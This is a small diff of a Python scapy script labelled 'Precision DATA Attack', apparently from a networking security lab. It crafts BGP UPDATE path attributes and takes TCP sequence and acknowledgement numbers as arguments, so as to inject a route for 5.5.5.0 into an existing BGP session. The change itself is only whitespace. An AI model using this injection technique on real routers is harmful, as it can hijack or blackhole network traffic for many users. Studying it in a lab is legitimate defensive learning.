@@ -2,6 +2,7 @@
 # TEST 3: Precision DATA Attack
 # Sends BGP UPDATE packet and updates 5.5.5.0 as a routed path
 # python ./ test3 .py ( dstPort ) ( seqNum ) ( ackNum )
+
 import random
 from scapy.all import *
 
@@ -19,7 +20,7 @@ ackNum = int(sys.argv [3])
 paORIGIN = BGPPathAttribute(flags = 0x40, type = 1, attr_len = 1, value = '\x00')
 
 # PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
-paAS= BGPPathAttribute(flags = 0x40, type = 2, attr_len = 4, value = '\x02\x01\x01\x2c')
+paAS = BGPPathAttribute(flags = 0x40, type = 2, attr_len = 4, value = '\x02\x01\x01\x2c')
 
 # Path Next Hop [IP (100.2.3.2)]
 paNEXTHOP = BGPPathAttribute(flags = 0x40 , type = 3, attr_len = 4, value = '\x64\x02\x03\x02')
